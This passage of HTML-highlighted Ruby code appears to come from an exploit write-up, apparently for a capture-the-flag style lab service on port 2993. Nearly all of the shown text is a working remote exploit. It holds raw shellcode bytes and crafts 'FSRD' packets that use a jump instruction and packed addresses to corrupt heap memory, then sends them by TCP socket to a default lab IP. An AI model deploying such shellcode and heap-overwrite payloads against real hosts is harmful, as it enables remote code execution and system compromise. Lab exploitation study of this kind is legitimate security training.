-</span><span class='line'><span class="s2">&quot;</span><span class="se">\xbf\x9e\x53\x7d\x18\xda\xc5\xd9\x74\x24\xf4\x5e\x33\xc9</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\xb1\x12\x31\x7e\x12\x83\xee\xfc\x03\xe0\x5d\x9f\xed\x2d</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\xb9\xa8\xed\x1e\x7e\x04\x98\xa2\x09\x4b\xec\xc4\xc4\x0c</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x9e\x51\x67\x33\x6c\xe1\xce\x35\x97\x89\xaf\xc5\x67\x48</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x38\xc4\x67\x4f\x81\x41\x86\xff\x97\x01\x18\xac\xe4\xa1</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x13\xb3\xc6\x26\x71\x5b\xf6\x09\x05\xf3\x60\x79\x8b\x6a</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x1f\x0c\xa8\x3e\x8c\x87\xce\x0e\x39\x55\x90</span><span class="s2">&quot;</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">chunk1</span> <span class="o">=</span> <span class="s2">&quot;FSRD&quot;</span> <span class="o">+</span> <span class="s2">&quot;Aa0A&quot;</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\xeb\x0a</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;X&quot;</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">+</span> <span class="n">buf</span> <span class="o">+</span> <span class="s2">&quot;D&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">107</span> <span class="o">-</span> <span class="n">buf</span><span class="o">.</span><span class="n">length</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;/&quot;</span>
-</span><span class='line'><span class="n">chunk2</span> <span class="o">=</span> <span class="s2">&quot;FSRD&quot;</span> <span class="o">+</span> <span class="s2">&quot;ROOT/&quot;</span> <span class="o">+</span> <span class="o">[</span><span class="mh">0xfffffff8</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="o">[</span><span class="mh">0xfffffffc</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="o">[</span><span class="mh">0x804d410</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="o">[</span><span class="mh">0x804e010</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;X&quot;</span> <span class="o">*</span>  <span class="mi">103</span>
-</span><span class='line'><span class="n">chunk3</span> <span class="o">=</span> <span class="s2">&quot;DDDD&quot;</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">exploit</span> <span class="o">=</span> <span class="n">chunk1</span> <span class="o">+</span> <span class="n">chunk2</span> <span class="o">+</span> <span class="n">chunk3</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">host</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
-</span><span class='line'><span class="n">host</span> <span class="o">||=</span> <span class="s2">&quot;192.168.80.154&quot;</span>
-</span><span class='line'>
-</span><span class='line'><span class="nb">puts</span> <span class="s2">&quot;Using host: </span><span class="si">#{</span><span class="n">host</span><span class="si">}</span><span class="s2">&quot;</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span> <span class="n">host</span><span class="p">,</span> <span class="mi">2993</span>
-</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
-</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span>
-</span></code></pre></td></tr></table></div></figure>
 
 </div>
   
